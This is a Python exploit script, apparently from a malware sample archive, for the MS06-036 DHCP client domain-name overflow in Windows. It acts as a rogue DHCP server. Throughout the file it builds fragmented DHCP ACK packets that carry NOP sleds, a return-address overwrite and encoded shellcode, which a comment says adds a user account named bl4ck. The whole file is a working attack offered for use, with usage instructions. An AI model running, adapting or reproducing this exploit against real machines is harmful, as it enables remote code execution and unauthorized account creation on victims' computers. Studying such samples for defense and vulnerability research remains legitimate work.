#!/usr/bin/env python
#
#
# by redsand@blacksecurity.org
# 	this (like any thing) would not be possible w/out the bl4ck team.
#	thanks guys.
#
# VX-Underground Sample

import sys, os

sys.path.append("pydhcplib")

from scapy import *

from pydhcplib.dhcp_packet import *
from pydhcplib.dhcp_network import *
from pydhcplib.type_strlist import *
from pydhcplib.type_ipv4 import *
from pydhcplib.type_hw_addr import *

inet_face = "vmnet8"

default_ip = "10.31.33.7"

# user bl4ck/bl4ck
# this exits via Thread (so thta we kill the dhcp thread in services.exe
#
# this means if services doesn't crash, it was a successful exploit
# 
scode = "\x31\xc9\x83\xe9\xcb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x13" \
"\x43\x32\xa5\x83\xeb\xfc\xe2\xf4\xef\xab\x76\xa5\x13\x43\xb9\xe0" \
"\x2f\xc8\x4e\xa0\x6b\x42\xdd\x2e\x5c\x5b\xb9\xfa\x33\x42\xd9\xec" \
"\x98\x77\xb9\xa4\xfd\x72\xf2\x3c\xbf\xc7\xf2\xd1\x14\x82\xf8\xa8" \
"\x12\x81\xd9\x51\x28\x17\x16\xa1\x66\xa6\xb9\xfa\x37\x42\xd9\xc3" \
"\x98\x4f\x79\x2e\x4c\x5f\x33\x4e\x98\x5f\xb9\xa4\xf8\xca\x6e\x81" \
"\x17\x80\x03\x65\x77\xc8\x72\x95\x96\x83\x4a\xa9\x98\x03\x3e\x2e" \
"\x63\x5f\x9f\x2e\x7b\x4b\xd9\xac\x98\xc3\x82\xa5\x13\x43\xb9\xcd" \
"\x2f\x1c\x03\x53\x73\x15\xbb\x5d\x90\x83\x49\xf5\x7b\xac\xfc\x45" \
"\x73\x2b\xaa\x5b\x99\x4d\x65\x5a\xf4\x20\x5f\xc1\x3d\x26\x4a\xc0" \
"\x33\x6c\x51\x85\x7d\x26\x46\x85\x66\x30\x57\xd7\x33\x21\x5e\x91" \
"\x70\x28\x12\xc7\x7f\x77\x51\xce\x33\x6c\x73\xe1\x57\x63\x14\x83" \
"\x33\x2d\x57\xd1\x33\x2f\x5d\xc6\x72\x2f\x55\xd7\x7c\x36\x42\x85" \
"\x52\x27\x5f\xcc\x7d\x2a\x41\xd1\x61\x22\x46\xca\x61\x30\x12\xc7" \
"\x7f\x77\x51\xce\x33\x6c\x73\xe1\x57\x43\x32\xa5"



netopt = {'client_listen_port':"68",
           'server_listen_port':"67",
           'listen_address':"0.0.0.0"}


def substr(i,o,off):
    begin=i[:off]
    end=i[off+len(o):]
    ret=begin+o+end
    return ret

def io(i):
    str=""
    a=chr(i % 256)
    i=i >> 8
    b=chr(i % 256)
    i=i >> 8
    c=chr(i % 256)
    i=i >> 8
    d=chr(i % 256)
    
    str+="%c%c%c%c" % (a,b,c,d)

    return str

class Server(DhcpServer):
    def __init__(self, options):
        DhcpServer.__init__(self,options["listen_address"],
                            options["client_listen_port"],
                            options["server_listen_port"])

    def HandleDhcpDiscover(self, packet):
	my_reqip = ''

	my_reqip = default_ip

	sid_i = my_reqip.rfind(".")
	server_ip = my_reqip[0:sid_i] + ".254"

	our_ip = my_reqip[0:sid_i] + ".2"

	mymac = hwmac(packet.GetHardwareAddress()).str()
        print "** Received discover from %s (%s)" % (mymac,my_reqip)
	
	mpacket = DhcpPacket()
	mpacket.CreateDhcpOfferPacketFrom(packet)
	mpacket.SetOption("dhcp_message_type",[2])
	mpacket.SetOption("yiaddr", ipv4(my_reqip).list())
	mpacket.SetOption("siaddr", ipv4(server_ip).list())
	mpacket.SetOption("ip_address_lease_time",[0,0,7,8])
	mpacket.SetOption("flags",[0,0])
	mpacket.SetOption("server_identifier", ipv4(server_ip).list())
	mpacket.SetOption("subnet_mask", ipv4("255.255.255.0").list())
	mpacket.SetOption("domain_name_server", ipv4(our_ip).list())
	mpacket.SetOption("router",ipv4(our_ip).list())

        mpacket.SetOption("domain_name",strlist( ( "N" * 255 )).list())

	append = "\xfa\xff" + ( "\x90" * 0xff ) 
	append = "\xfa\xff" + ( "\x90" * 0xff ) 
	append = "\xfa\xff" + ( "\x90" * 0xff ) 
	append = "\xfa\xff" + ( "\x90" * 0xff ) 
	append = "\xfa\xff" + ( "\x90" * 0xff ) 

	p = Ether(dst=mymac,src=get_if_hwaddr(inet_face))/IP(src=server_ip,dst="255.255.255.255",ttl=16)/UDP(sport=67,dport=68)/mpacket.EncodePacket('') 

	print "** Sending DHCP Offer Packet to %s from %s" % (my_reqip,server_ip)
	sendp(p, iface=inet_face, verbose=False)
        
    def HandleDhcpRequest(self, packet):


	ip = packet.GetOption("request_ip_address")
        sid = packet.GetOption("server_identifier")
        ciaddr = packet.GetOption("ciaddr")
	my_reqip = ''
	try:
		data = packet.options_data['request_ip_address']
		for i in range(0,len(data),4) :
                	    if len(data[i:i+4]) == 4 :
                        	my_reqip += ipv4(data[i:i+4]).str()
	except:
		my_reqip = default_ip

	mymac = hwmac(packet.GetHardwareAddress()).str()
        print "** Received request from %s (%s)" % (my_reqip,mymac)
	sid_i = my_reqip.rfind(".")
	server_ip = my_reqip[0:sid_i] + ".254"

	our_ip = my_reqip[0:sid_i] + ".2"

	mypacket = DhcpPacket()
	mypacket.CreateDhcpAckPacketFrom(packet)
	mypacket.SetOption("yiaddr", ipv4(my_reqip).list())

	dumbstr = "\x90" * 0xFF

	# we're looking for a jmp/call ebx ?! or landing in our codespace
	# directly

	# C5 converts to 253C
	# BB = 2557
	# AA = 00AC
	# DD = 258C
	# EE = 03B5
	# 88 = 00D6
	# 99 = 00EA
	# F3 = 2591
	# B0 = 2264
	# 8F = 00c5

	eipstr = ( "\xB9\x0b" * ( 254 / 2) ) + "\x64"
	#eipstr = "C" * 0xFF


	payload = "\x42" * 0xFF
	payload = substr(payload, scode, 1)


	## find location in heap to ret2
	# find offset & append as many "\x26\x6e\x43\x6e" 
	# to increment ebx to a non trashed location (since ebx points to our code)
	# then push ebx \x53 and  \xc4 (retn) 
	# 
	# we're looking for a pop+pop+ret or a jmp/call ebx to return to our
	# unicode filtered input
	# note it must be iwthin the bounds of 0x0000**** - 0x0070****
	# or 0x22***** <-- wont help us

	append = "\x0f\xff" + ( "\x90" * 0xff ) 
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( eipstr )
	append += "\xfa\xff" + ( eipstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( dumbstr )
	append += "\xfa\xff" + ( payload[0:254]) + "\x00"

	print "Length of our attack: %r" % len(append)

	eth = Ether(dst=mymac,src=get_if_hwaddr(inet_face))
	p = fragment(IP(src=server_ip,dst=my_reqip,ttl=16)/UDP(sport=67,dport=68)/mypacket.EncodePacket(append), 1024)
	print "** Sending DHCP ACK response (len: %r) to %s from %s" % (len(append), my_reqip,server_ip)
	for i in p:
		sendp(eth/i, iface=inet_face, verbose=False)

    def HandleDhcpDecline(self, packet):
	return 
	#print "** Dhcp Declined"
        #packet.PrintHeaders()
        #packet.PrintOptions()
        
    def HandleDhcpRelease(self, packet):
	return
        #packet.PrintHeaders()
        #packet.PrintOptions()
        
    def HandleDhcpInform(self, packet):
	return
        #packet.PrintHeaders()
        #packet.PrintOptions()



print "[BL4CK] - MS06-036 DHCP Client Domain Name Overflow"
print "\t by redsand@blacksecurity.org"
print "Usage: %s [interface] [forced request ip]" % sys.argv[0]
print ""


if len(sys.argv) > 1:
	inet_face = sys.argv[1]

if len(sys.argv) > 2:
	default_ip = sys.argv[2]

print "Listening for client requests:\n"
print "Listening on interface: %s" % inet_face
print "Using default address: %s" % default_ip

server = Server(netopt)

while True :
    server.GetNextDhcpPacket()